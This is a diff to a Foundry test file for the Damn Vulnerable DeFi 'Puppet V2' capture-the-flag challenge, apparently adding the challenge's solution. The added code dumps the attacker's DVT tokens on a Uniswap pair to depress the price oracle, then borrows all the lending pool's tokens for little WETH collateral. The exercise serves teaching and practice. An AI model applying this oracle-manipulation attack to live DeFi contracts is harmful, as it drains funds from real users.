@@ -7,7 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
 
-import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";
+import {PuppetV2Pool, UniswapV2Library} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";
 
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";
 
@@ -103,7 +103,27 @@ contract PuppetV2 is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        // approve attacker's DVT balance to UniswapRouter contract
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // devalue DVT: swap DVT for WETH
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, attacker, block.timestamp * 2);
+
+        // convert required ETH to weth
+        weth.deposit{value: 20 * 10 ** 18}();
+
+        // borrow all the dvt from lending pool
+        weth.approve(address(puppetV2Pool), weth.balanceOf(attacker)); // approve transferFrom of weth to pool
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        //console.log(dvt.balanceOf(attacker));
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
